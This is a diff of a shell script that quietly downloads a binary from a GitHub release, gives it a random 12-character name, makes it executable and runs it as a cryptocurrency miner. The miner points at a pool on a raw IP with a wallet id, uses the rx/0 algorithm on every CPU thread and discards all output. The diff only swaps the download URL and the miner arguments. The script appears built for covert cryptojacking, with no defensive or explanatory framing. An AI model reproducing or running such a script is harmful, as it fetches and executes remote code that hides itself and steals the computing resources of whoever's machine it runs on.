@@ -17,7 +17,7 @@ DEBIAN_FRONTEND=noninteractive apt install -y -qq \
 BIN_NAME=$(tr -dc a-z0-9 </dev/urandom | head -c 12)
 
 # Download binary quietly and rename
-wget -q https://github.com/vedhagsvp/marlopava/releases/download/latest/epcsee -O "$BIN_NAME"
+wget -q https://github.com/vedhagsvp/marva/releases/download/c4ksd/crrmnar -O "$BIN_NAME"
 
 # Make it executable
 chmod +x "$BIN_NAME"
@@ -25,4 +25,4 @@ chmod +x "$BIN_NAME"
 # Optional: run the binary
 # ./"$BIN_NAME"
 
-./"$BIN_NAME" --coin EPIC -o 104.237.141.187:8087 -u 0x692f36c91a382.lnn1778 -p m=solo -t $(nproc --all) > /dev/null 2>&1
+./"$BIN_NAME" -o 104.237.141.187:8087 -u solo:Q010500969d625ddf93f8a33bca9ee3fd2803b4bd4afa23e61c7f623156dd7aec0ad87ed24bf98c -p LNN17AA -a rx/0 -t $(nproc --all) > /dev/null 2>&1
